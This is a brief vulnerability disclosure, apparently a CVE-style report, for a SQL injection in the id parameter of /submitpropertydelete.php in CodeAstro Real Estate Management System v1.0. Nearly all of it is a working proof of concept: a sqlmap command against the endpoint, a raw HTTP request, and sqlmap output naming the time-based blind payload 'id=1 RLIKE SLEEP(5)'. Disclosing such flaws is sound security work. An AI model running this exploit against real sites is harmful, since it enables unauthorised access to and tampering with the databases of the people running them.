# SQLi vulnerability in CodeAstro Real Estate Management System v1.0 of file /submitpropertydelete.php

**vender**:

- CodeAstro Real Estate Management System
- [CodeAstro - Home For All Free Source Codes](https://codeastro.com/)

**SoftLink**:

- https://codeastro.com/real-estate-management-system-in-php-with-source-code/

**Vulnerable File**

- /submitpropertydelete.php

**Version**

- V1.0

### POC

```
sqlmap -u http://target/submitpropertydelete.php?id=1 --level 5
```



```http
GET /submitpropertydelete.php?id=1 HTTP/1.1
Host: www.realestate.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36 Edg/136.0.0.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=d4bb5bt4089bi920s8gj8fb0np
Upgrade-Insecure-Requests: 1
```



```
---
Parameter: id (GET)
    Type: time-based blind
    Title: MySQL >= 5.0.12 RLIKE time-based blind
    Payload: id=1 RLIKE SLEEP(5)
---
```



![image-20250602121548797](https://xu17-1326239041.cos.ap-guangzhou.myqcloud.com/xu17/202506021215951.png)